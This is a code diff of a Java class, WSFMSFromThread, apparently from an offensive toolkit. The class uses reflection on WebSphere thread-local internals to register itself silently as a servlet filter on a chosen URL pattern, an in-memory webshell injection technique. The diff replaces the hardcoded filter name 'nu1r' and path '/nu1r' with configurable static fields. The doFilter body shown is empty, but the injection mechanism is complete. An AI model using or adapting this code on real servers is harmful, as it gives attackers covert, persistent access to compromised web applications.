@@ -13,13 +13,12 @@ import java.util.List;
  */
 public class WSFMSFromThread implements Filter {
 
-    public Session session;
+    public static String pattern;
+
+    public static String NAME;
 
     static {
         try {
-            String filterName = "nu1r" + System.nanoTime();
-            String urlPattern = "/nu1r";
-
             Class                   clazz = Thread.currentThread().getClass();
             java.lang.reflect.Field field = clazz.getDeclaredField("wsThreadLocals");
             field.setAccessible(true);
@@ -56,7 +55,7 @@ public class WSFMSFromThread implements Filter {
                     for (int i = 0; i < filerMappings.size(); i++) {
                         Object filterConfig = filerMappings.get(i).getClass().getMethod("getFilterConfig", new Class[0]).invoke(filerMappings.get(i), new Object[0]);
                         String name         = (String) filterConfig.getClass().getMethod("getFilterName", new Class[0]).invoke(filterConfig, new Object[0]);
-                        if (name.equals(filterName)) {
+                        if (name.equals(NAME)) {
                             flag = true;
                             break;
                         }
@@ -66,7 +65,7 @@ public class WSFMSFromThread implements Filter {
                     if (!flag) {
                         Filter filter = new WSFMSFromThread();
 
-                        Object filterConfig = context.getClass().getMethod("createFilterConfig", new Class[]{String.class}).invoke(context, new Object[]{filterName});
+                        Object filterConfig = context.getClass().getMethod("createFilterConfig", new Class[]{String.class}).invoke(context, new Object[]{NAME});
                         filterConfig.getClass().getMethod("setFilter", new Class[]{Filter.class}).invoke(filterConfig, new Object[]{filter});
 
                         method = null;
@@ -87,7 +86,7 @@ public class WSFMSFromThread implements Filter {
                         field.set(filterConfig, null);
 
                         method = filterConfig.getClass().getDeclaredMethod("addMappingForUrlPatterns", new Class[]{EnumSet.class, boolean.class, String[].class});
-                        method.invoke(filterConfig, new Object[]{EnumSet.of(DispatcherType.REQUEST), true, new String[]{urlPattern}});
+                        method.invoke(filterConfig, new Object[]{EnumSet.of(DispatcherType.REQUEST), true, new String[]{pattern}});
 
                         //addMappingForUrlPatterns 流程走完，再将其设置为原来的值
                         field.set(filterConfig, original);
@@ -120,7 +119,6 @@ public class WSFMSFromThread implements Filter {
 
     @Override
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-
     }
 
     @Override
